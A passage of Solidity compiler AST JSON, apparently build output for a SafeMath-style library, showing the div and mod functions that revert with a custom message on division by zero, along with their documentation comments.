																	"src": "6022:5:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"id": 432,
																	"name": "errorMessage",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 423,
																	"src": "6029:12:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 428,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	4294967278,
																	4294967278
																],
																"referencedDeclaration": 4294967278,
																"src": "6014:7:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 433,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6014:28:2",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 434,
														"nodeType": "ExpressionStatement",
														"src": "6014:28:2"
													},
													{
														"expression": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 437,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 435,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 419,
																"src": "6064:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"id": 436,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 421,
																"src": "6068:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "6064:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"functionReturnParameters": 427,
														"id": 438,
														"nodeType": "Return",
														"src": "6057:12:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 417,
										"nodeType": "StructuredDocumentation",
										"src": "5359:484:2",
										"text": " @dev Returns the integer division of two unsigned integers, reverting with custom message on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 441,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nameLocation": "5858:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 424,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 419,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "5880:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 441,
												"src": "5872:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 418,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5872:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 421,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "5900:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 441,
												"src": "5892:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 420,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5892:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 423,
												"mutability": "mutable",
												"name": "errorMessage",
												"nameLocation": "5926:12:2",
												"nodeType": "VariableDeclaration",
												"scope": 441,
												"src": "5912:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 422,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5912:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5861:84:2"
									},
									"returnParameters": {
										"id": 427,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 426,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 441,
												"src": "5969:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 425,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5969:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5968:9:2"
									},
									"scope": 467,
									"src": "5849:239:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 465,
										"nodeType": "Block",
										"src": "6880:110:2",
										"statements": [
											{
												"id": 464,
												"nodeType": "UncheckedBlock",
												"src": "6891:92:2",
												"statements": [
													{
														"expression": {
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 456,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 454,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 446,
																		"src": "6924:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": ">",
																	"rightExpression": {
																		"hexValue": "30",
																		"id": 455,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6928:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	},
																	"src": "6924:5:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"id": 457,
																	"name": "errorMessage",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 448,
																	"src": "6931:12:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 453,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	4294967278,
																	4294967278
																],
																"referencedDeclaration": 4294967278,
																"src": "6916:7:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 458,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6916:28:2",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 459,
														"nodeType": "ExpressionStatement",
														"src": "6916:28:2"
													},
													{
														"expression": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 462,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 460,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 444,
																"src": "6966:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "%",
															"rightExpression": {
																"id": 461,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 446,
																"src": "6970:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "6966:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"functionReturnParameters": 452,
														"id": 463,
														"nodeType": "Return",
														"src": "6959:12:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 442,
										"nodeType": "StructuredDocumentation",
										"src": "6096:649:2",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n reverting with custom message when dividing by zero.\n CAUTION: This function is deprecated because it requires allocating memory for the error\n message unnecessarily. For custom revert reasons use {tryMod}.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 466,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nameLocation": "6760:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 449,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 444,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "6782:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 466,
												"src": "6774:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 443,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6774:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 446,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "6802:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 466,
												"src": "6794:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 445,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6794:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 448,
												"mutability": "mutable",
												"name": "errorMessage",
												"nameLocation": "6828:12:2",
												"nodeType": "VariableDeclaration",
												"scope": 466,
												"src": "6814:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 447,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "6814:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "6763:84:2"
									},
									"returnParameters": {
										"id": 452,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 451,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 466,
												"src": "6871:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 450,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6871:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "6870:9:2"
									},
									"scope": 467,
									"src": "6751:239:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 468,
							"src": "482:6511:2",
							"usedErrors": []
						}
					],
					"src": "95:6898:2"
				},
				"id": 2
			}
		}
	}
}